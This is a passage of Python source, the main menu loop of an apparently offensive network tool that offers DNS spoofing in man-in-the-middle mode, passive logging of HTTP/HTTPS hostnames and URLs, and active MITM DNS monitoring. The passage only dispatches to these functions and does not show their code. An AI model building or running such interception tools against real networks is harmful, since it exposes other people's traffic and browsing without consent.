    global iface, mitm_active

    mitm_active = False

   
    display_banner()

    
    ensure_logs_dir()

    signal.signal(signal.SIGINT, signal_handler)

    iface = select_interface()
    print(f"[*] Selected interface: {iface}")

    while True:
        print("\n--- Main Menu ---")
        print("1. DNS Spoofing (MITM Mode)")
        print("2. HTTP/HTTPS Hostname & URL Logging (Passive Mode)")
        print("3. DNS Traffic Monitor (Active MITM)")
        print("4. Exit")
        choice = input("Enter your choice: ")

        if choice == '1':
            run_dns_mitm_mode()
            stop_event.clear()
        elif choice == '2':
            run_passive_monitoring_mode()
            stop_event.clear()
        elif choice == '3':
            run_dns_traffic_monitor_active_mitm_mode()
            stop_event.clear()
        elif choice == '4':
            print("[*] Exiting program.")
            break
        else:
            print("Invalid choice. Please enter 1, 2, 3, or 4.")

if __name__ == "__main__":
    main()
